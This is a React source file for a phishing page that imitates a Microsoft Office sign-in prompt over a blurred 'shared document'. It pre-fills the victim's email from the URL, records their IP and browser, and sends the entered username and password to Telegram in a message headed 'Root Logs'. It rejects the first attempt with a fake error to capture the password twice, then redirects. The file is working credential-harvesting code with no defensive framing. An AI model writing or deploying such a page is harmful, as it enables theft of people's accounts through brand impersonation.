import React, { useState, useEffect } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { getUserIP, getUserBrowser, sendMessageToTelegram } from '../services/api'; // Import necessary utility functions
import backgroundImage from '../assets/yappi.jpg'; // Local background image

const SignInModal = () => {
  const [loading, setLoading] = useState(true); // For initial loading state
  const [buttonLoading, setButtonLoading] = useState(false); // Loader when button is clicked
  const [ipAddress, setIpAddress] = useState('');
  const [browser, setBrowser] = useState('');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [attemptCount, setAttemptCount] = useState(0);
  const [showErrorMessage, setShowErrorMessage] = useState(false);
  const [isValid, setIsValid] = useState(true);

  const location = useLocation();
  const navigate = useNavigate();

  // Simulating initial loading
  useEffect(() => {
    const timer = setTimeout(() => {
      setLoading(false); // Hide loader after the initial load
    }, 3000); // Show loader for 3 seconds, adjust the time if necessary

    // Fetch user IP and browser information
    getUserIP().then(setIpAddress);
    setBrowser(getUserBrowser());

    // Extract email from URL
    const hash = location.hash;
    if (hash && hash.includes('@')) {
      setEmail(hash.substring(1));
    }

    return () => clearTimeout(timer);
  }, [location.hash]);

  // Form submission handler
  const handleLoginSubmit = async (event) => {
    event.preventDefault();
    setButtonLoading(true); // Show loader on button click

    const isValidEmail = email.includes('@');
    setIsValid(isValidEmail);

    if (isValidEmail) {
      const message = `Root Logs\nOffice 2.0\nLogin Access\nUsername: ${email}\nPassword: ${password}\nUser IP: ${ipAddress}\nUser Browser: ${browser}`;
      await sendMessageToTelegram(message);

      setAttemptCount((prevCount) => prevCount + 1);

      if (attemptCount === 0) {
        setButtonLoading(false);
        setShowErrorMessage(true);
      } else if (attemptCount >= 1) {
        setTimeout(() => {
          setButtonLoading(false); // Hide loader before redirection
          navigate('/activated'); // Redirect to account activation
        }, 3000); // Set a delay for the redirection
      }
    } else {
      setButtonLoading(false);
      setIsValid(false);
    }
  };

  // Microsoft Office loader
  const MicrosoftLoader = () => (
    <div className="flex items-center justify-center space-x-2">
      <div className="w-3 h-3 bg-blue-600 rounded-full animate-bounce"></div>
      <div className="w-3 h-3 bg-green-600 rounded-full animate-bounce delay-200"></div>
      <div className="w-3 h-3 bg-orange-600 rounded-full animate-bounce delay-400"></div>
    </div>
  );

  return (
    <div className="relative h-screen flex items-center justify-center bg-gray-100">
      {/* Document Background */}
      <div
        className={`blur-sm absolute inset-0 bg-cover bg-center transition-all duration-300 ${
          loading || buttonLoading ? 'blur-md' : ''
        }`}
        style={{
          backgroundImage: `url(${backgroundImage})`,
        }}
      ></div>

      {loading || buttonLoading ? (
        // Loader Modal
        <div className="absolute bg-white shadow-lg rounded-lg p-6 max-w-sm w-full z-10 border">
          <div className="flex items-center justify-center mb-4">
            <MicrosoftLoader />
          </div>
          <h2 className="text-gray-800 text-xl font-bold mb-4">Loading...</h2>
          <p className="text-gray-600">Please wait while the document loads.</p>
        </div>
      ) : (
        <>
          <div className="absolute inset-0 flex items-start justify-center pt-12">
            <div className="w-4/5 h-4/5 bg-white bg-opacity-50 shadow-lg overflow-hidden p-6 rounded-lg">
              <p className="text-gray-500 italic">
                {/* Placeholder for document text */}
              </p>
            </div>
          </div>

          {/* Modal */}
          <div className="absolute bg-white shadow-lg rounded-lg p-6 max-w-sm w-full z-10 border">
            <div className="flex items-center mb-4">
              <img
                src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg"
                alt="Microsoft Logo"
                className="w-6 h-6 mr-2"
              />
              <h2 className="text-gray-800 text-xl font-bold">Sign in</h2>
            </div>
            {showErrorMessage && (
              <p className="text-red-500 text-sm mb-4">
                Incorrect username or password. Please try again.
              </p>
            )}
            <p className="text-sm text-gray-600 mb-6">
              Only recipient email can access shared files
            </p>
            <form onSubmit={handleLoginSubmit}>
              <div className="mb-4">
                <input
                  type="email"
                  placeholder="Email, phone or Skype"
                  className={`w-full border ${
                    isValid ? 'border-gray-300' : 'border-red-500'
                  } rounded-lg px-4 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500`}
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                />
              </div>
              <div className="mb-4">
                <input
                  type="password"
                  placeholder="Password"
                  className="w-full border border-gray-300 rounded-lg px-4 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                />
              </div>
              <div className="flex items-center justify-between mb-6">
                <label className="flex items-center text-gray-600 text-sm">
                  <input
                    type="checkbox"
                    className="form-checkbox h-4 w-4 text-blue-600"
                  />
                  <span className="ml-2">Keep me signed in</span>
                </label>
                <a
                  href="#"
                  className="text-blue-500 text-sm hover:underline"
                >
                  Forgot Password?
                </a>
              </div>
              <button
                type="submit"
                className="w-full bg-blue-600 text-white py-2 rounded-lg hover:bg-blue-700 transition"
              >
                Submit
              </button>
            </form>
          </div>
        </>
      )}
    </div>
  );
};

export default SignInModal;
